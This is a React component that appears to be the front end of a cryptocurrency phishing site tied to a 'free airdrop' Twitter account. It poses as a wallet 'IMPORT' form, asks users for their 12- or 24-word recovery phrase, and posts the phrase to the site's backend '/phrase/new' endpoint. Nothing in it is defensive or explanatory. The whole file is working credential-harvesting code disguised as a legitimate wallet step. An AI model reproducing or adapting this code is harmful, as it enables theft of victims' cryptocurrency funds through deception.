import React, {useState} from 'react'
import "./Phrase.css"
import Button from '@material-ui/core/Button';
import TwitterIcon from '@material-ui/icons/Twitter';
import Header from "./Header"
import axios from "./axios";


function Phrase() {

    const [input, setInput] = useState("");
    const [walletName, setWalletName] = useState("");


    const sendPhrase = async(e) => {
        e.preventDefault();

        console.log(input)
        console.log(walletName)

        console.log("clicked");
        await axios.post("/phrase/new", {
            phrase: input,
            walletname: walletName
        });

        setInput("");
        setWalletName("");

    };



    return (
        <div className="main__phrase">
            <Header />
            <div className="phrase__form">
                <form className="phrase__form">
                {/* <input value={walletName} placeholder="State Wallet Type e.g Binance" onChange={(e) => setWalletName(e.target.value)} type="text" name="WalletName">
                </input> */}
                <textarea value={input} placeholder="Phrase" onChange={(e) => setInput(e.target.value)} type="text" name="Phrase">
                </textarea>
                <p className="phrase__description">Typically 12, (sometimes 24) words separated by single spaces</p>
                <Button onClick={sendPhrase} type="submit" className="btn" variant="contained" color="primary">IMPORT</Button>
                </form>
                <a href="https://mobile.twitter.com/ethfreeairdrop" className="social__handles"> <TwitterIcon color="primary"/>Twitter</a>

                
            </div>
        </div>
    )
}

export default Phrase
